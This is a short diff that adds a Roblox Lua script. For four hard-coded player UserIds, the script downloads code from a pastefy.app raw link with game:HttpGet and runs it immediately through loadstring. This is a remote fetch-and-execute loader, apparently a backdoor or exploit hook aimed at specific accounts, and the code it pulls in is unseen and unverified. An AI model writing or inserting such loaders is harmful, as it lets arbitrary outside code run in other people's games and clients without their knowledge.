@@ -1,0 +1,12 @@
+if game.Players.LocalPlayer.UserId == 5862877124 then
+loadstring(game:HttpGet("https://pastefy.app/aGTfEPfu/raw"))()
+end
+if game.Players.LocalPlayer.UserId == 6059299693 then
+loadstring(game:HttpGet("https://pastefy.app/aGTfEPfu/raw"))()
+end
+if game.Players.LocalPlayer.UserId == 1118277276 then
+loadstring(game:HttpGet("https://pastefy.app/aGTfEPfu/raw"))()
+end
+if game.Players.LocalPlayer.UserId == 1823618796 then
+loadstring(game:HttpGet("https://pastefy.app/aGTfEPfu/raw"))()
+end
